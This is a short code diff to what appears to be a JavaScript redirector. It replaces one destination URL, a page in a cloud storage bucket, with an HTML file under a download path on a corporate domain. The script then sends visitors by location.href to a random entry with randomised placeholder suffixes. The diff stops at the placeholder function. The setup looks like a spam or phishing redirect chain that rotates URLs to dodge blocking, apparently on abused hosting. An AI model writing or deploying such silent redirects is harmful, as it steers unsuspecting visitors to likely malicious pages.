@@ -1,5 +1,5 @@
 var urls=[
-' https://css-backup-1622887635143.obs.cn-north-4.myhuaweicloud.com/d65d9cbc36cc483b963e147ea77ec8c9.htm#{nnnnnnn}{wwww}',
+' https://chat.misumi.com.cn/download/1000_/202406/1718731295_34758_bfa70a15_99eb_4a7a_9f32_d919249b96e9.html#{nnnnnnn}{wwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
